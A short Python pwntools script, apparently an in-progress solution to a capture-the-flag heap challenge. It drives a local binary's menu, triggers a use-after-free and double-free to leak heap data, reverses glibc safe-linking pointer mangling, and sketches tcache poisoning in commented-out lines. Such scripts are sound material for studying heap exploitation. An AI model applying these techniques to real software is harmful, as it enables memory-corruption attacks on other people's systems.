from pwn import *

def decrypt(addr):
    key = 0
    plain = 0

    for i in range (1,7):
        bits = 64-12*i
        if(bits < 0):
            bits = 0
        plain = ((addr ^ key) >> bits) << bits
        key = plain >> 12
    return plain
def add_data(size, data):
    r.sendline(b'1')
    r.sendline(str(size).encode())
    r.sendline(data)

def del_data(idx):
    r.sendline(b'2')
    r.sendline(str(idx).encode())

def print_data():
    r.sendline(b'3')

r = process('./chall')

pid = gdb.attach(r, gdbscript='''
                 break *__isoc99_scanf

                 ''')

target = 0x4141414141414141

# alloc index 0 and 1
add_data(8, b'A'*8)
add_data(8, b'B'*8)

# del index 0
del_data('0')

# Set index 0, since the pointer still exists
# this doesn't actually call malloc.
#
# We do this so that index 0 shows up again in order to delete later
#add_data(8, b'C'*8)
add_data(8, b'D'*8)
del_data('1')
del_data('0')

print_data()

r.interactive()




#target = 0x4141414141414141
#new_addr =  target ^ real_addr >> 12 
#print("new addr: " + hex(new_addr))
#add_data(8,p64(new_addr))
#
#r.interactive()

